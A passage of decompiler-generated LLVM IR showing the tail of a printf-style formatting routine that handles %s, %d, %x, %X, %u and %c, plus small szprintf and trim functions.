  %v5_804868e.lcssa = phi i32 [ %v5_804868e28, %dec_label_pc_804868b.preheader ], [ %v5_804868e35, %dec_label_pc_8048694 ], [ %v5_804868e, %dec_label_pc_8048667 ]
  store i32 %v4_804868b.lcssa, i32* %eax.global-to-local, align 4
  %v2_80486a0 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80486a0 = zext i8 %v2_80486a0 to i32
  %v6_80486a0 = or i32 %v3_80486a0, %v5_804868e.lcssa
  store i32 %v6_80486a0, i32* %eax.global-to-local, align 4
  %v10_80486a2 = icmp eq i8 %v2_80486a0, 115
  %v1_80486a4 = icmp eq i1 %v10_80486a2, false
  br i1 %v1_80486a4, label %dec_label_pc_80486e8, label %dec_label_pc_80486a6

dec_label_pc_80486a6:                             ; preds = %dec_label_pc_804869d
  %v1_80486a9 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80486b1 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80486b1 = load i32, i32* %v1_80486b1, align 4
  store i32 %v2_80486b1, i32* %eax.global-to-local, align 4
  %v4_80486b6 = icmp eq i32 %v2_80486b1, 0
  br i1 %v4_80486b6, label %dec_label_pc_80486cb, label %dec_label_pc_80486bc

dec_label_pc_80486bc:                             ; preds = %dec_label_pc_80486a6
  store i32 %v2_80486b1, i32* %eax.global-to-local, align 4
  %v5_80486bf = inttoptr i32 %v2_80486b1 to i8*
  br label %dec_label_pc_80486cb

dec_label_pc_80486cb:                             ; preds = %dec_label_pc_80486a6, %dec_label_pc_80486bc
  %storemerge = phi i8* [ %v5_80486bf, %dec_label_pc_80486bc ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_804fd15.12, i32 0, i32 0), %dec_label_pc_80486a6 ]
  %v4_80486cb = ptrtoint i8* %storemerge to i32
  store i32 %v4_80486cb, i32* %eax.global-to-local, align 4
  %v5_80486ce = add i32 %v0_804880a, -4
  %v6_80486ce = inttoptr i32 %v5_80486ce to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80486ce, align 4
  %v5_80486d1 = add i32 %v0_804880a, -8
  %v6_80486d1 = inttoptr i32 %v5_80486d1 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80486d1, align 4
  %v0_80486d4 = load i32, i32* %eax.global-to-local, align 4
  %v2_80486d4 = add i32 %v0_804880a, -12
  %v3_80486d4 = inttoptr i32 %v2_80486d4 to i32*
  store i32 %v0_80486d4, i32* %v3_80486d4, align 4
  %v5_80486d5 = add i32 %v0_804880a, -16
  %v6_80486d5 = inttoptr i32 %v5_80486d5 to i32*
  store i32 %tmp3, i32* %v6_80486d5, align 4
  %v5_80486d8 = inttoptr i32 %stack_var_-36.0.lcssa to i8*
  %v6_80486d8 = call i32 @prints(i32 %v4_80486cb, i8* %v5_80486d8, i32 %stack_var_-32.0.lcssa, i32 %stack_var_-28.154)
  store i32 %v6_80486d8, i32* %eax.global-to-local, align 4
  %v0_80486dd = load i32, i32* @esp, align 4
  %v1_80486dd = add i32 %v0_80486dd, 16
  %v5_80486e0 = add i32 %v6_80486d8, %stack_var_-28.154
  br label %dec_label_pc_804881c

dec_label_pc_80486e8:                             ; preds = %dec_label_pc_804869d
  store i32 %v4_804868b.lcssa, i32* %eax.global-to-local, align 4
  %v2_80486eb = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80486eb = zext i8 %v2_80486eb to i32
  %v6_80486eb = or i32 %v3_80486eb, %v5_804868e.lcssa
  store i32 %v6_80486eb, i32* %eax.global-to-local, align 4
  %v10_80486ed = icmp eq i8 %v2_80486eb, 100
  %v1_80486ef = icmp eq i1 %v10_80486ed, false
  br i1 %v1_80486ef, label %dec_label_pc_8048721, label %dec_label_pc_80486f1

dec_label_pc_80486f1:                             ; preds = %dec_label_pc_80486e8
  %v1_80486f4 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80486fc = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80486fc = load i32, i32* %v1_80486fc, align 4
  store i32 %v2_80486fc, i32* %eax.global-to-local, align 4
  %v1_8048701 = add i32 %v0_804880a, -8
  %v2_8048701 = inttoptr i32 %v1_8048701 to i32*
  store i32 97, i32* %v2_8048701, align 4
  %v5_8048703 = add i32 %v0_804880a, -12
  %v6_8048703 = inttoptr i32 %v5_8048703 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048703, align 4
  %v5_8048706 = add i32 %v0_804880a, -16
  %v6_8048706 = inttoptr i32 %v5_8048706 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048706, align 4
  %v1_8048709 = add i32 %v0_804880a, -20
  %v2_8048709 = inttoptr i32 %v1_8048709 to i32*
  store i32 1, i32* %v2_8048709, align 4
  %v1_804870b = add i32 %v0_804880a, -24
  %v2_804870b = inttoptr i32 %v1_804870b to i32*
  store i32 10, i32* %v2_804870b, align 4
  %v0_804870d = load i32, i32* %eax.global-to-local, align 4
  %v2_804870d = add i32 %v0_804880a, -28
  %v3_804870d = inttoptr i32 %v2_804870d to i32*
  store i32 %v0_804870d, i32* %v3_804870d, align 4
  %v5_804870e = add i32 %v0_804880a, -32
  %v6_804870e = inttoptr i32 %v5_804870e to i32*
  store i32 %tmp3, i32* %v6_804870e, align 4
  %v1_8048711 = call i32 @printi(i32 %v1_80486f4)
  store i32 %v1_8048711, i32* %eax.global-to-local, align 4
  %v0_8048716 = load i32, i32* @esp, align 4
  %v1_8048716 = add i32 %v0_8048716, 32
  %v5_8048719 = add i32 %v1_8048711, %stack_var_-28.154
  br label %dec_label_pc_804881c

dec_label_pc_8048721:                             ; preds = %dec_label_pc_80486e8
  store i32 %v4_804868b.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048724 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048724 = zext i8 %v2_8048724 to i32
  %v6_8048724 = or i32 %v3_8048724, %v5_804868e.lcssa
  store i32 %v6_8048724, i32* %eax.global-to-local, align 4
  %v10_8048726 = icmp eq i8 %v2_8048724, 120
  %v1_8048728 = icmp eq i1 %v10_8048726, false
  br i1 %v1_8048728, label %dec_label_pc_804875a, label %dec_label_pc_804872a

dec_label_pc_804872a:                             ; preds = %dec_label_pc_8048721
  %v1_804872d = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048735 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048735 = load i32, i32* %v1_8048735, align 4
  store i32 %v2_8048735, i32* %eax.global-to-local, align 4
  %v1_804873a = add i32 %v0_804880a, -8
  %v2_804873a = inttoptr i32 %v1_804873a to i32*
  store i32 97, i32* %v2_804873a, align 4
  %v5_804873c = add i32 %v0_804880a, -12
  %v6_804873c = inttoptr i32 %v5_804873c to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804873c, align 4
  %v5_804873f = add i32 %v0_804880a, -16
  %v6_804873f = inttoptr i32 %v5_804873f to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804873f, align 4
  %v1_8048742 = add i32 %v0_804880a, -20
  %v2_8048742 = inttoptr i32 %v1_8048742 to i32*
  store i32 0, i32* %v2_8048742, align 4
  %v1_8048744 = add i32 %v0_804880a, -24
  %v2_8048744 = inttoptr i32 %v1_8048744 to i32*
  store i32 16, i32* %v2_8048744, align 4
  %v0_8048746 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048746 = add i32 %v0_804880a, -28
  %v3_8048746 = inttoptr i32 %v2_8048746 to i32*
  store i32 %v0_8048746, i32* %v3_8048746, align 4
  %v5_8048747 = add i32 %v0_804880a, -32
  %v6_8048747 = inttoptr i32 %v5_8048747 to i32*
  store i32 %tmp3, i32* %v6_8048747, align 4
  %v1_804874a = call i32 @printi(i32 %v1_804872d)
  store i32 %v1_804874a, i32* %eax.global-to-local, align 4
  %v0_804874f = load i32, i32* @esp, align 4
  %v1_804874f = add i32 %v0_804874f, 32
  %v5_8048752 = add i32 %v1_804874a, %stack_var_-28.154
  br label %dec_label_pc_804881c

dec_label_pc_804875a:                             ; preds = %dec_label_pc_8048721
  store i32 %v4_804868b.lcssa, i32* %eax.global-to-local, align 4
  %v2_804875d = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804875d = zext i8 %v2_804875d to i32
  %v6_804875d = or i32 %v3_804875d, %v5_804868e.lcssa
  store i32 %v6_804875d, i32* %eax.global-to-local, align 4
  %v10_804875f = icmp eq i8 %v2_804875d, 88
  %v1_8048761 = icmp eq i1 %v10_804875f, false
  br i1 %v1_8048761, label %dec_label_pc_8048793, label %dec_label_pc_8048763

dec_label_pc_8048763:                             ; preds = %dec_label_pc_804875a
  %v1_8048766 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_804876e = inttoptr i32 %stack_var_12.152 to i32*
  %v2_804876e = load i32, i32* %v1_804876e, align 4
  store i32 %v2_804876e, i32* %eax.global-to-local, align 4
  %v1_8048773 = add i32 %v0_804880a, -8
  %v2_8048773 = inttoptr i32 %v1_8048773 to i32*
  store i32 65, i32* %v2_8048773, align 4
  %v5_8048775 = add i32 %v0_804880a, -12
  %v6_8048775 = inttoptr i32 %v5_8048775 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048775, align 4
  %v5_8048778 = add i32 %v0_804880a, -16
  %v6_8048778 = inttoptr i32 %v5_8048778 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048778, align 4
  %v1_804877b = add i32 %v0_804880a, -20
  %v2_804877b = inttoptr i32 %v1_804877b to i32*
  store i32 0, i32* %v2_804877b, align 4
  %v1_804877d = add i32 %v0_804880a, -24
  %v2_804877d = inttoptr i32 %v1_804877d to i32*
  store i32 16, i32* %v2_804877d, align 4
  %v0_804877f = load i32, i32* %eax.global-to-local, align 4
  %v2_804877f = add i32 %v0_804880a, -28
  %v3_804877f = inttoptr i32 %v2_804877f to i32*
  store i32 %v0_804877f, i32* %v3_804877f, align 4
  %v5_8048780 = add i32 %v0_804880a, -32
  %v6_8048780 = inttoptr i32 %v5_8048780 to i32*
  store i32 %tmp3, i32* %v6_8048780, align 4
  %v1_8048783 = call i32 @printi(i32 %v1_8048766)
  store i32 %v1_8048783, i32* %eax.global-to-local, align 4
  %v0_8048788 = load i32, i32* @esp, align 4
  %v1_8048788 = add i32 %v0_8048788, 32
  %v5_804878b = add i32 %v1_8048783, %stack_var_-28.154
  br label %dec_label_pc_804881c

dec_label_pc_8048793:                             ; preds = %dec_label_pc_804875a
  store i32 %v4_804868b.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048796 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048796 = zext i8 %v2_8048796 to i32
  %v6_8048796 = or i32 %v3_8048796, %v5_804868e.lcssa
  store i32 %v6_8048796, i32* %eax.global-to-local, align 4
  %v10_8048798 = icmp eq i8 %v2_8048796, 117
  %v1_804879a = icmp eq i1 %v10_8048798, false
  br i1 %v1_804879a, label %dec_label_pc_80487c9, label %dec_label_pc_804879c

dec_label_pc_804879c:                             ; preds = %dec_label_pc_8048793
  %v1_804879f = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80487a7 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80487a7 = load i32, i32* %v1_80487a7, align 4
  store i32 %v2_80487a7, i32* %eax.global-to-local, align 4
  %v1_80487ac = add i32 %v0_804880a, -8
  %v2_80487ac = inttoptr i32 %v1_80487ac to i32*
  store i32 97, i32* %v2_80487ac, align 4
  %v5_80487ae = add i32 %v0_804880a, -12
  %v6_80487ae = inttoptr i32 %v5_80487ae to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80487ae, align 4
  %v5_80487b1 = add i32 %v0_804880a, -16
  %v6_80487b1 = inttoptr i32 %v5_80487b1 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80487b1, align 4
  %v1_80487b4 = add i32 %v0_804880a, -20
  %v2_80487b4 = inttoptr i32 %v1_80487b4 to i32*
  store i32 0, i32* %v2_80487b4, align 4
  %v1_80487b6 = add i32 %v0_804880a, -24
  %v2_80487b6 = inttoptr i32 %v1_80487b6 to i32*
  store i32 10, i32* %v2_80487b6, align 4
  %v0_80487b8 = load i32, i32* %eax.global-to-local, align 4
  %v2_80487b8 = add i32 %v0_804880a, -28
  %v3_80487b8 = inttoptr i32 %v2_80487b8 to i32*
  store i32 %v0_80487b8, i32* %v3_80487b8, align 4
  %v5_80487b9 = add i32 %v0_804880a, -32
  %v6_80487b9 = inttoptr i32 %v5_80487b9 to i32*
  store i32 %tmp3, i32* %v6_80487b9, align 4
  %v1_80487bc = call i32 @printi(i32 %v1_804879f)
  store i32 %v1_80487bc, i32* %eax.global-to-local, align 4
  %v0_80487c1 = load i32, i32* @esp, align 4
  %v1_80487c1 = add i32 %v0_80487c1, 32
  %v5_80487c4 = add i32 %v1_80487bc, %stack_var_-28.154
  br label %dec_label_pc_804881c

dec_label_pc_80487c9:                             ; preds = %dec_label_pc_8048793
  store i32 %v4_804868b.lcssa, i32* %eax.global-to-local, align 4
  %v2_80487cc = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80487cc = zext i8 %v2_80487cc to i32
  %v6_80487cc = or i32 %v3_80487cc, %v5_804868e.lcssa
  store i32 %v6_80487cc, i32* %eax.global-to-local, align 4
  %v10_80487ce = icmp eq i8 %v2_80487cc, 99
  %v1_80487d0 = icmp eq i1 %v10_80487ce, false
  br i1 %v1_80487d0, label %dec_label_pc_804881c, label %dec_label_pc_80487d2

dec_label_pc_80487d2:                             ; preds = %dec_label_pc_80487c9
  %v1_80487d5 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80487dd = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80487dd = load i32, i32* %v1_80487dd, align 4
  store i32 %v2_80487dd, i32* %stack_var_-6, align 4
  %v5_80487e6 = add i32 %v0_804880a, -4
  %v6_80487e6 = inttoptr i32 %v5_80487e6 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80487e6, align 4
  %v5_80487e9 = add i32 %v0_804880a, -8
  %v6_80487e9 = inttoptr i32 %v5_80487e9 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80487e9, align 4
  store i32 %v2_80487ec, i32* %eax.global-to-local, align 4
  %v2_80487ef = add i32 %v0_804880a, -12
  %v3_80487ef = inttoptr i32 %v2_80487ef to i32*
  store i32 %v2_80487ec, i32* %v3_80487ef, align 4
  %v5_80487f0 = add i32 %v0_804880a, -16
  %v6_80487f0 = inttoptr i32 %v5_80487f0 to i32*
  store i32 %tmp3, i32* %v6_80487f0, align 4
  %v0_80487f3 = load i32, i32* %stack_var_-6, align 4
  %v6_80487f3 = call i32 @prints(i32 %v0_80487f3, i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_80487f3, i32* %eax.global-to-local, align 4
  %v0_80487f8 = load i32, i32* @esp, align 4
  %v1_80487f8 = add i32 %v0_80487f8, 16
  %v5_80487fb = add i32 %v6_80487f3, %stack_var_-28.154
  br label %dec_label_pc_804881c

dec_label_pc_8048800:                             ; preds = %dec_label_pc_8048633, %dec_label_pc_8048609
  %stack_var_8.2 = phi i8* [ %stack_var_8.455, %dec_label_pc_8048609 ], [ %v22_8048616, %dec_label_pc_8048633 ]
  %v4_8048800 = ptrtoint i8* %stack_var_8.2 to i32
  store i32 %v4_8048800, i32* %eax.global-to-local, align 4
  %v2_8048803 = load i8, i8* %stack_var_8.2, align 1
  %v3_8048803 = zext i8 %v2_8048803 to i32
  store i32 %v3_8048803, i32* %eax.global-to-local, align 4
  %v2_804880d = add i32 %v0_804880a, -12
  %v3_804880d = inttoptr i32 %v2_804880d to i32*
  store i32 %v3_8048803, i32* %v3_804880d, align 4
  %v5_804880e = add i32 %v0_804880a, -16
  %v6_804880e = inttoptr i32 %v5_804880e to i32*
  store i32 %tmp3, i32* %v6_804880e, align 4
  %v2_8048811 = inttoptr i32 %stack_var_-28.154 to i32*
  %v3_8048811 = call i32 @printchar(i32* %v2_8048811, i32 %stack_var_-24.151)
  store i32 %v3_8048811, i32* %eax.global-to-local, align 4
  %v0_8048816 = load i32, i32* @esp, align 4
  %v1_8048816 = add i32 %v0_8048816, 16
  %v4_8048819 = add i32 %stack_var_-28.154, 1
  br label %dec_label_pc_804881c

dec_label_pc_804881c:                             ; preds = %dec_label_pc_80487c9, %dec_label_pc_80487d2, %dec_label_pc_804879c, %dec_label_pc_8048763, %dec_label_pc_804872a, %dec_label_pc_80486f1, %dec_label_pc_80486cb, %dec_label_pc_8048800
  %v4_80486ce66 = phi i32 [ %v1_8048816, %dec_label_pc_8048800 ], [ %v0_804880a, %dec_label_pc_80487c9 ], [ %v1_80487f8, %dec_label_pc_80487d2 ], [ %v1_80487c1, %dec_label_pc_804879c ], [ %v1_8048788, %dec_label_pc_8048763 ], [ %v1_804874f, %dec_label_pc_804872a ], [ %v1_8048716, %dec_label_pc_80486f1 ], [ %v1_80486dd, %dec_label_pc_80486cb ]
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.151, %dec_label_pc_8048800 ], [ %stack_var_-24.151, %dec_label_pc_80487c9 ], [ %stack_var_-24.151, %dec_label_pc_80487d2 ], [ %stack_var_-24.151, %dec_label_pc_804879c ], [ %stack_var_-24.151, %dec_label_pc_8048763 ], [ %stack_var_-24.151, %dec_label_pc_804872a ], [ %stack_var_-24.151, %dec_label_pc_80486f1 ], [ %v2_80486b1, %dec_label_pc_80486cb ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.152, %dec_label_pc_8048800 ], [ %stack_var_12.152, %dec_label_pc_80487c9 ], [ %v1_80487d5, %dec_label_pc_80487d2 ], [ %v1_804879f, %dec_label_pc_804879c ], [ %v1_8048766, %dec_label_pc_8048763 ], [ %v1_804872d, %dec_label_pc_804872a ], [ %v1_80486f4, %dec_label_pc_80486f1 ], [ %v1_80486a9, %dec_label_pc_80486cb ]
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_8048800 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80487c9 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80487d2 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804879c ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048763 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804872a ], [ %stack_var_8.1.lcssa, %dec_label_pc_80486f1 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80486cb ]
  %stack_var_-28.0 = phi i32 [ %v4_8048819, %dec_label_pc_8048800 ], [ %stack_var_-28.154, %dec_label_pc_80487c9 ], [ %v5_80487fb, %dec_label_pc_80487d2 ], [ %v5_80487c4, %dec_label_pc_804879c ], [ %v5_804878b, %dec_label_pc_8048763 ], [ %v5_8048752, %dec_label_pc_804872a ], [ %v5_8048719, %dec_label_pc_80486f1 ], [ %v5_80486e0, %dec_label_pc_80486cb ]
  %v4_804881c = ptrtoint i8* %stack_var_8.3 to i32
  %v5_804881c = add i32 %v4_804881c, 1
  %stack_var_8.4 = inttoptr i32 %v5_804881c to i8*
  store i32 %v5_804881c, i32* %eax.global-to-local, align 4
  %v2_8048822 = load i8, i8* %stack_var_8.4, align 1
  %v3_8048822 = zext i8 %v2_8048822 to i32
  %v5_8048822 = and i32 %v5_804881c, -256
  %v6_8048822 = or i32 %v3_8048822, %v5_8048822
  store i32 %v6_8048822, i32* %eax.global-to-local, align 4
  %v4_8048824 = icmp eq i8 %v2_8048822, 0
  %v1_8048826 = icmp eq i1 %v4_8048824, false
  br i1 %v1_8048826, label %dec_label_pc_8048609, label %dec_label_pc_804882c

dec_label_pc_804882c:                             ; preds = %dec_label_pc_804881c, %dec_label_pc_8048616, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.154, %dec_label_pc_8048616 ], [ %stack_var_-28.0, %dec_label_pc_804881c ]
  %v4_804882c = icmp eq i32* %arg1, null
  br i1 %v4_804882c, label %dec_label_pc_804883a, label %dec_label_pc_8048832

dec_label_pc_8048832:                             ; preds = %dec_label_pc_804882c
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v2_8048835 = load i32, i32* %arg1, align 4
  store i32 %v2_8048835, i32* %eax.global-to-local, align 4
  %v1_8048837 = inttoptr i32 %v2_8048835 to i8*
  store i8 0, i8* %v1_8048837, align 1
  br label %dec_label_pc_804883a

dec_label_pc_804883a:                             ; preds = %dec_label_pc_804882c, %dec_label_pc_8048832
  store i32 %stack_var_-28.1.lcssa, i32* %eax.global-to-local, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i32 %v5_8048822, { 1, 0 }
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_804881c, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.2, { 0, 2, 1 }
  uselistorder i32 %v2_80486b1, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_804868e.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_804868b.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.1.lcssa, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-36.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %stack_var_-32.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_8048655, { 1, 2, 3, 0 }
  uselistorder i8* %v22_8048616, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-24.151, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_12.152, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 %stack_var_8.4.in53, { 2, 1, 0 }
  uselistorder i32 %stack_var_-28.154, { 0, 3, 2, 1, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 %v0_804880a, { 38, 1, 0, 5, 4, 3, 2, 12, 11, 10, 9, 8, 7, 6, 19, 18, 17, 16, 15, 14, 13, 26, 25, 24, 23, 22, 21, 20, 33, 32, 31, 30, 29, 28, 27, 37, 36, 35, 34 }
  uselistorder i32 %tmp3, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 6, 7, 8, 64, 65, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 50, 51, 52, 53, 49, 3, 2, 54, 55, 1, 0, 56, 57, 58, 59, 60, 61, 62, 63, 5, 4 }
  uselistorder i32 (i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_804883a, { 1, 0 }
  uselistorder label %dec_label_pc_804881c, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80486cb, { 1, 0 }
  uselistorder label %dec_label_pc_804869d, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048694, { 1, 0 }
  uselistorder label %dec_label_pc_8048655, { 1, 0 }
  uselistorder label %dec_label_pc_8048609, { 1, 0 }
}

define i32 @szprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v4_8048848 = ptrtoint i32* %stack_var_12 to i32
  %v4_8048859 = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_8048848)
  ret i32 %v4_8048859
}

define i32 @trim() local_unnamed_addr {
entry:
  %tmp8 = call i8* @__decompiler_undefined_function_3()
  %stack_var_-8 = alloca i32, align 4
  %v0_8048866 = load i32, i32* @edi, align 4
  store i32 %v0_8048866, i32* %stack_var_-8, align 4
  %v4_8048871 = ptrtoint i8* %tmp8 to i32
  %v3_8048882 = call i32 @_strlen(i8* %tmp8)
  %v1_8048889 = add i32 %v3_8048882, -1
  br label %dec_label_pc_8048892

dec_label_pc_804888f:                             ; preds = %dec_label_pc_8048892
  %v4_804888f = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_8048892

dec_label_pc_8048892:                             ; preds = %entry, %dec_label_pc_804888f
  %stack_var_-16.0 = phi i32 [ 0, %entry ], [ %v4_804888f, %dec_label_pc_804888f ]
  %v6_8048895 = add i32 %stack_var_-16.0, %v4_8048871
  %v1_8048898 = inttoptr i32 %v6_8048895 to i8*
  %v2_8048898 = load i8, i8* %v1_8048898, align 1
  %v2_804889a = sext i8 %v2_8048898 to i32
  %v2_804889d = mul nsw i32 %v2_804889a, 2
  %v0_80488a1 = load i32, i32* inttoptr (i32 134553656 to i32*), align 8
  %v2_80488a6 = add i32 %v0_80488a1, %v2_804889d
  %v1_80488a9 = inttoptr i32 %v2_80488a6 to i16*
  %v2_80488a9 = load i16, i16* %v1_80488a9, align 2
  %v1_80488b1 = and i16 %v2_80488a9, 32
  %v2_80488b1 = icmp eq i16 %v1_80488b1, 0
  %v1_80488b6 = icmp eq i1 %v2_80488b1, false
  br i1 %v1_80488b6, label %dec_label_pc_804888f, label %dec_label_pc_80488bd.preheader

dec_label_pc_80488bd.preheader:                   ; preds = %dec_label_pc_8048892
  %v5_80488c319 = icmp slt i32 %v1_8048889, %stack_var_-16.0
  br i1 %v5_80488c319, label %dec_label_pc_80488eb, label %dec_label_pc_80488c5.lr.ph

dec_label_pc_80488c5.lr.ph:                       ; preds = %dec_label_pc_80488bd.preheader
  %v0_80488d4.pre = load i32, i32* @global_var_8052038, align 8
  br label %dec_label_pc_80488c5

dec_label_pc_80488ba:                             ; preds = %dec_label_pc_80488c5
  %v5_80488ba = add i32 %stack_var_-12.0.in20, -1
  %v5_80488c3 = icmp slt i32 %v5_80488ba, %stack_var_-16.0
  br i1 %v5_80488c3, label %dec_label_pc_80488eb, label %dec_label_pc_80488c5

dec_label_pc_80488c5:                             ; preds = %dec_label_pc_80488c5.lr.ph, %dec_label_pc_80488ba
  %stack_var_-12.0.in20 = phi i32 [ %v1_8048889, %dec_label_pc_80488c5.lr.ph ], [ %v5_80488ba, %dec_label_pc_80488ba ]
  %v6_80488c8 = add i32 %stack_var_-12.0.in20, %v4_8048871
  %v1_80488cb = inttoptr i32 %v6_80488c8 to i8*
  %v2_80488cb = load i8, i8* %v1_80488cb, align 1
  %v2_80488cd = sext i8 %v2_80488cb to i32
  %v2_80488d0 = mul nsw i32 %v2_80488cd, 2
  %v2_80488d9 = add i32 %v0_80488d4.pre, %v2_80488d0
  %v1_80488dc = inttoptr i32 %v2_80488d9 to i16*
  %v2_80488dc = load i16, i16* %v1_80488dc, align 2
  %v1_80488e4 = and i16 %v2_80488dc, 32
  %v2_80488e4 = icmp eq i16 %v1_80488e4, 0
  %v1_80488e9 = icmp eq i1 %v2_80488e4, false
  br i1 %v1_80488e9, label %dec_label_pc_80488ba, label %dec_label_pc_80488eb

dec_label_pc_80488eb:                             ; preds = %dec_label_pc_80488ba, %dec_label_pc_80488c5, %dec_label_pc_80488bd.preheader
  %stack_var_-12.0.in.lcssa = phi i32 [ %v1_8048889, %dec_label_pc_80488bd.preheader ], [ %stack_var_-12.0.in20, %dec_label_pc_80488c5 ], [ %v5_80488ba, %dec_label_pc_80488ba ]
  %v7_804891314 = icmp sgt i32 %stack_var_-16.0, %stack_var_-12.0.in.lcssa
  store i32 %stack_var_-16.0, i32* @edx, align 4
  br i1 %v7_804891314, label %dec_label_pc_8048915, label %dec_label_pc_80488f3

dec_label_pc_80488f3:                             ; preds = %dec_label_pc_80488eb, %dec_label_pc_80488f3
  %v6_804891d16 = phi i32 [ %v6_804891d, %dec_label_pc_80488f3 ], [ %v4_8048871, %dec_label_pc_80488eb ]
  %storemerge.in15 = phi i32 [ %v5_804890a, %dec_label_pc_80488f3 ], [ %stack_var_-16.0, %dec_label_pc_80488eb ]
  %v6_8048903 = add i32 %storemerge.in15, %v4_8048871
  %v1_8048906 = inttoptr i32 %v6_8048903 to i8*
  %v2_8048906 = load i8, i8* %v1_8048906, align 1
  %v3_8048908 = inttoptr i32 %v6_804891d16 to i8*
  store i8 %v2_8048906, i8* %v3_8048908, align 1
  %v5_804890a = add i32 %storemerge.in15, 1
  %v7_8048913 = icmp sgt i32 %v5_804890a, %stack_var_-12.0.in.lcssa
  store i32 %stack_var_-16.0, i32* @edx, align 4
  %v2_804891b = sub i32 %v5_804890a, %stack_var_-16.0
  %v6_804891d = add i32 %v2_804891b, %v4_8048871
  br i1 %v7_8048913, label %dec_label_pc_8048915, label %dec_label_pc_80488f3

dec_label_pc_8048915:                             ; preds = %dec_label_pc_80488f3, %dec_label_pc_80488eb
  %v6_804891d.lcssa = phi i32 [ %v4_8048871, %dec_label_pc_80488eb ], [ %v6_804891d, %dec_label_pc_80488f3 ]
  %v22_804891d = inttoptr i32 %v6_804891d.lcssa to i8*
  store i8 0, i8* %v22_804891d, align 1
  %v2_8048926 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048926, i32* @edi, align 4
  ret i32 %v6_804891d.lcssa

; uselistorder directives
  uselistorder i32 %v6_804891d.lcssa, { 1, 0 }
  uselistorder i32 %v5_804890a, { 2, 1, 0 }
  uselistorder i32 %stack_var_-12.0.in.lcssa, { 1, 0 }
